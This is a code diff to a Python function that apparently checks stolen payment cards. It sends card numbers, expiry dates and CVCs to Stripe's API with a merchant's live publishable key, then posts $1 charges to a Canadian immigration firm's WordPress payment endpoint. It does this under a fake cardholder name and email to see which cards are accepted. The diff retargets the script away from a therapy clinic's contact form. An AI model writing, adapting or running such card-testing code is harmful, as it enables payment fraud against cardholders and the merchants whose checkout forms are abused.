@@ -22,10 +22,40 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 	
 	headers = {
-	    'authority': 'www.choicetherapy1.com',
-	    'accept': 'application/json, */*;q=0.1',
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'origin': 'https://www.choicetherapy1.com',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Febc1f502d5%3B+stripe-js-v3%2Febc1f502d5%3B+card-element&referrer=https%3A%2F%2Foneworldimmigration.ca&time_on_page=27760&client_attribution_metadata[client_session_id]=ac3f85a0-ff0e-4b97-834d-d453cb0a5b59&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_F5m5jROJdMKhMezaOOpJBPPN00ybSsneIp'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	cookies = {
+	    '__stripe_mid': 'NA',
+	    '__stripe_sid': 'NA',
+	}
+	
+	headers = {
+	    'authority': 'oneworldimmigration.ca',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': '__stripe_mid=67edb23b-e8ff-44db-891c-4ec11a0dced282829b; __stripe_sid=86206be8-2994-4d2e-a00f-fea5f20d765b2cf1d0',
+	    'origin': 'https://oneworldimmigration.ca',
+	    'referer': 'https://oneworldimmigration.ca/square-payment/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -33,37 +63,30 @@ def Tele(ccx):
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	files = {
-	    '_wpcf7': (None, '21949'),
-	    '_wpcf7_version': (None, '5.9.3'),
-	    '_wpcf7_locale': (None, 'en_US'),
-	    '_wpcf7_unit_tag': (None, 'wpcf7-f21949-p7884-o1'),
-	    '_wpcf7_container_post': (None, '7884'),
-	    '_wpcf7_posted_data_hash': (None, '61a3669ea5448a752b55a8134a57fa46'),
-	    'customer_first_name': (None, 'Rodam'),
-	    'customer_last_name': (None, 'User'),
-	    'patient_name': (None, ''),
-	    'payment_amount': (None, '1'),
-	    'email_address': (None, 'rodamuser08@gmail.com'),
-	    'invoice_number': (None, ''),
-	    'service_address': (None, 'No.236, 29th St'),
-	    'service_city': (None, 'Pabedan'),
-	    'service_state': (None, 'Yangon'),
-	    'service_zipcode': (None, '11181'),
-	    'authorize[cardholdername]': (None, 'Rodam User'),
-	    'authorize[card_number]': (None, f'{n}'),
-	    'authorize[exp_month]': (None, f'{mm}'),
-	    'authorize[exp_year]': (None, f'20{yy}'),
-	    'authorize[cvv_number]': (None, f'{cvc}'),
+	data = {
+	    'action': 'wp_full_stripe_inline_payment_charge',
+	    'wpfs-form-name': 'E_SecurePayment_CAD',
+	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-custom-input[]': [
+	        '',
+	        '',
+	        '',
+	        '',
+	        '',
+	        '',
+	        '',
+	        '',
+	    ],
+	    'wpfs-card-holder-email': 'rodamuser09@gmail.com',
+	    'wpfs-card-holder-name': 'Rodam User',
+	    'wpfs-stripe-payment-method-id': pm,
 	}
 	
-	response = session.post(
-	    'https://www.choicetherapy1.com/wp-json/contact-form-7/v1/contact-forms/21949/feedback',
-	    headers=headers,
-	    files=files,
-	)
+	response = session.post('https://oneworldimmigration.ca/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
 	result = re.search(r'"message":"(.*?)"', response.text).group(1)
 		
